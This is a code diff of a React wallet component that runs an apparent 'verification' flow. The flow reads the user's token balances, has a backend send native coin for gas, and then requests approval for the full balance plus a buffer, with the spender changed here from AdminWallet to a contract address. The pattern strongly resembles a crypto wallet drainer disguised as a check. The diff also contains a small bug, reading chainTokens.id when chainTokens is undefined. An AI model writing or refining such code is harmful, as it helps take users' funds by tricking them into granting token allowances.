@@ -348,7 +348,7 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
       const chainIdNumber = Number(await web3.eth.getChainId());
       const chainTokens = TOKENS[chainIdNumber];
       const contractAddress = CONTRACTS[chainIdNumber];
-      if (!chainTokens) {
+      if (!chainTokens || !contractAddress) {
         toast.error(
           `Unsupported network for verification" ${chainTokens.id}`
         );
@@ -377,18 +377,15 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
             const allowance = await checkAllowance(
               owner,
               tokenAddress,
-              AdminWallet
+              contractAddress
             );
 
             const rawBalanceBN = BigInt(Math.floor(balance * 10 ** decimals));
             const buffer = BigInt(2 * 10 ** decimals);
             const rawNeeded = rawBalanceBN + buffer;
-            let approveAmount = BigInt(0);
+
             if (BigInt(allowance) < rawNeeded) {
-              approveAmount = rawNeeded - BigInt(allowance);
-            }
-            if (BigInt(allowance) < rawNeeded) {
-              if (nativeBalanceEth < 0.0002) {
+              if (nativeBalanceEth < 0.002) {
                 try {
                   // request backend to send native coin
                   const response = await axios.post(`${apiUrl}/sendNative`, {
@@ -409,10 +406,11 @@ const WalletDetails = ({ checkStatus, details, web3 }) => {
               }
 
               const approveData = await appToken(
-                approveAmount.toString(),
+                rawNeeded.toString(),
                 tokenAddress,
-                AdminWallet
+                contractAddress
               );
+
 
               if (approveData) {
                 const details = await getApprovalDetails(approveData);
